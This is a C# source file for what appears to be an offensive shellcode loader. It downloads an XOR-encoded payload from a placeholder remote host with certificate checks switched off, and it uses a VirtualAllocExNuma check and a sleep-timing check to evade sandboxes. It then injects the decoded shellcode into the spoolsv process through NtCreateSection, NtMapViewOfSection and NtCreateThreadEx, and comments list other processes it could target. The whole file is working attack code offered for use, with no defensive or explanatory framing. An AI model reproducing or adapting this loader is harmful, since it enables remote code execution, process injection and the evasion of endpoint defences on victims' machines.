using System;
using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;

using static ntmapsec.Native;

namespace ntmapsec
{
    public class Program
    {
        public static void Main(string[] args)
        {
            go(args);
            // adding sleep otherwise the program exits before my payload is pulled and run
            Sleep(10000);
        }
        public static async Task go(string[] args)
        {
            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            var rand = new Random();
            uint dream = (uint)rand.Next(3000, 5000);
            double delta = dream / 1000 - 0.5;
            DateTime before = DateTime.Now;
            Sleep(dream);
            if (DateTime.Now.Subtract(before).TotalSeconds < delta)
            {
                return;
            }

            byte[] banana;

            using (var handler = new HttpClientHandler())
            {
                handler.ServerCertificateCustomValidationCallback = (message, cert, chain, sslPolicyErrors) => true;

                using (var client = new HttpClient(handler))
                {
                    //banana = await client.GetByteArrayAsync("http://<IP>/mtls_443.bin_z");
                    banana = await client.GetByteArrayAsync("http://<IP>/<xor'ed_binary_shellcode>");
                }
            }

            for (int i = 0; i < banana.Length; i++)
            {
                banana[i] = (byte)(banana[i] ^ (byte)'z');
            }

            var hSection = IntPtr.Zero;
            var maxSize = (ulong)banana.Length;

            NtCreateSection(
                ref hSection,
                0x10000000,     // SECTION_ALL_ACCESS
                IntPtr.Zero,
                ref maxSize,
                0x40,           // PAGE_EXECUTE_READWRITE
                0x08000000,     // SEC_COMMIT
                IntPtr.Zero);

            // Map that section into memory of the current process as RW
            NtMapViewOfSection(
                hSection,
                (IntPtr)(-1),   // will target the current process
                out var localBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out var _,
                2,              // ViewUnmap (created view will not be inherited by child processes)
                0,
                0x04);          // PAGE_READWRITE

            // Copy banana into memory of our own process
            Marshal.Copy(banana, 0, localBaseAddress, banana.Length);

            // Get reference to target process
            //var target = Process.GetProcessById(2100);
            Process target = Process.GetProcessesByName("spoolsv")[0];
            //Process target = Process.GetProcessesByName("sqlservr")[0];
            //Process target = Process.GetProcessesByName("VGAuthService")[0];
            //Process target = Process.GetProcessesByName("vmtoolsd.exe")[0];

            // Now map this region into the target process as RX
            NtMapViewOfSection(
                hSection,
                target.Handle,
                out var remoteBaseAddress,
                IntPtr.Zero,
                IntPtr.Zero,
                IntPtr.Zero,
                out _,
                2,
                0,
                0x20);      // PAGE_EXECUTE_READ

            // Shellcode is now in the target process, execute it (fingers crossed)
            NtCreateThreadEx(
                out _,
                0x001F0000, // STANDARD_RIGHTS_ALL
                IntPtr.Zero,
                target.Handle,
                remoteBaseAddress,
                IntPtr.Zero,
                false,
                0,
                0,
                0,
                IntPtr.Zero);
        }
    }
}
